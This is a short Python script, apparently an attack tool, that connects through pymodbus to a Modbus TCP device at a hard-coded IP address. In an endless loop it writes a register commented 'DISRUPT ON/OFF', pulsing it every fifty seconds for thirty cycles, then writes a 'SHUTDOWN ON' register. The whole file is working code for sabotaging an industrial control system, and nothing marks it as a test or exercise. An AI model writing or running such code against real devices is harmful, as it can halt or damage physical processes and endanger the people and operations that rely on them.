#!/usr/bin/env python

from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.exceptions import ConnectionException
from time import sleep
import logging

logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.INFO)

#####################################
# Code
#####################################
client = ModbusClient('73.9.13.10', port=53)

try:
    client.connect()
    while True:
      for x in range(0, 30):
         rq = client.write_register(0x91DC, 1) # DISRUPT ON 1
         sleep(5)
         rq = client.write_register(0x91DC, 0) # DISRUPT OFF 1
         sleep(45) 
      rq = client.write_register(0x91DB, 1) # SHUTDOWN ON
      sleep(30)
except KeyboardInterrupt:
    client.close()
except ConnectionException:
    print "Unable to connect / Connection lost"
